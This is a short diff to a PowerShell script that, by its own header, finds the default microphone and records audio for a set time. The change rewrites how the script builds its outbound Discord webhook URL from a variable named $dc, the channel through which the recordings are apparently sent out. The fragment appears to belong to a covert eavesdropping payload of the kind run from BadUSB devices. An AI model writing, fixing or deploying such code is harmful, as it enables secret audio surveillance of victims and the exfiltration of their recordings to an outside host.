@@ -5,7 +5,9 @@ This script finds the default microphone and records for a specified time to a m
 
 #>
 $hookurl = "$dc"
-if ($hookurl.Ln -lt 120){$hookurl = (irm $hookurl).url}
+if ($hookurl.Length -lt 120){
+	$hookurl = ("https://discord.com/api/webhooks/" + "$dc")
+}
 
 Function RecordAudio{
 param ([int[]]$t)
